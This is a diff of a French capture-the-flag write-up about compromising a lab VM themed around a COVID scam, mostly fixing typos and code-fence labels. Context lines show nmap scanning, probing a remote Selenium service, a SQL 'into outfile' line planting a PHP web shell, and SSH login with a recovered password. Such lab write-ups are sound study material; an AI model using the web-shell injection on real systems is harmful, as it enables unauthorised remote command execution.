@@ -10,7 +10,7 @@ Scammers gonna scam
 
 Sur fond d'arnaque lié au COVID-19 on doit pénétrer le serveur des scammers et obtenir 3 flags.  
 
-```
+```console
 $ sudo nmap -p- -sC -sV -T5 192.168.56.116
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.116
@@ -92,7 +92,7 @@ Un nouveau scan de port fait cette fois apparaître un nouveau venu sur le port 
 
 Nmap y voit du [Mongoose](https://en.wikipedia.org/wiki/Mongoose_(web_server)) mais aucun entête ne permet de vérifier cette information. On obtient juste une réponse étrange :  
 
-```
+```console
 $ curl -D- http://192.168.56.116:443/
 HTTP/1.1 404 Not Found
 Cache: no-cache
@@ -106,7 +106,7 @@ Le serveur semble avoir du mal à traiter la charge face à un buster quelconque
 
 Ça ressemble à du *Selenium* en remote. *Selenium* est grosso-modo un wrapper permettant d'automatiser différents browsers headless et il a un mécanisme de session qui ressemble à ça.  
 
-La requête suivante a finit de me convaincre :  
+La requête suivante a fini de me convaincre :  
 
 ```javascript
 $ curl -s http://192.168.56.116:443/sessions | python3 -m json.tool
@@ -249,11 +249,11 @@ select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/yolo.php';
 Ça va mieux
 -----------
 
-Sur le système on remarque un utilisateur nommé *moneygrabber* et le mot de passe *delta1* est accepté, il est donc possible de se connecter via SSH :)  
+Sur le système, on remarque un utilisateur nommé *moneygrabber* et le mot de passe *delta1* est accepté, il est donc possible de se connecter via SSH :)  
 
 Petite chasse aux flags :  
 
-```bash
+```console
 [moneygrabber@ppeshop tmp]$ find / -iname "flag*.txt" 2> /dev/null 
 /var/www/flag1.txt
 /home/moneygrabber/flag2.txt
